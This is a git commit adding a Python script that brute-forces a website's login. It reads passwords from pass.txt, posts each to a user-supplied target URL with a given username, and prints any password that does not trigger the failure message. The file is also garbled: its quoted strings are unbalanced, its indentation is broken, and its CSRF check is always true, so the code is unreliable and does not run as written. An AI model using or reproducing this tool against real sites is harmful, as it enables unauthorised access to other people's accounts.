670152b66e4e6f1d11424511803d79efb18a2f50
hugetsu2009 <110633267+hugetsu2009@users.noreply.github.com>
2022-08-20 21:49:34 +0300

    Add files via upload

---
+++ brute/ihana.py
@@ -0,0 +1,61 @@
+######################################################################################################
+# Title: Brute force                                                                                 #
+# Author: Tanvir Hossain Antu                                                                        #
+# Github : https://github.com/Antu7                                                                  #
+######################################################################################################
+
+print("        _                           ")
+print("       | |__  _ __ _   _             ")
+print ("      | '_ \| '__| | | |             ")
+print("       | |_) | |  | |_| |            ")
+print("       |_.__/|_|   \__,_|              ")                                     
+                                                                            
+            
+        print ("  nice ")
+""")
+
+z = """     
+       print ("Checking the server ")
+        
+        
+    print ("wait damm second")
+
+
+import requests
+import time
+import sys
+
+url = input("Enter Target Url: ")
+username = input("Enter Target Username: ")
+error = input("Enter Wrong Password Error Message: ")
+
+for c in z:
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    time.sleep(0.02)
+
+try: 
+    def bruteCracking(username,url,error):
+        count = 0
+        for password in passwords:
+            password = password.strip()
+            count = count + 1
+            print("Trying Password: "+ str(count) + ' Time For => ' + password)
+            data_dict = {"LogInID": username,"Password":password, "Log In":"submit"}
+            response = requests.post(url, data=data_dict)
+            if error in str(response.content):
+                pass
+            elif "CSRF" or "csrf" in str(response.content):
+                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
+                exit()
+            else:
+                print("Username: ---> " + username)
+                print("Password: ---> " + password)
+                exit()
+except:
+    print("Some Error Occurred Please Check Your Internet Connection !!")
+
+with open("pass.txt", "r") as passwords:
+    bruteCracking(username,url,error)
+
+print("[!!] password not in list")
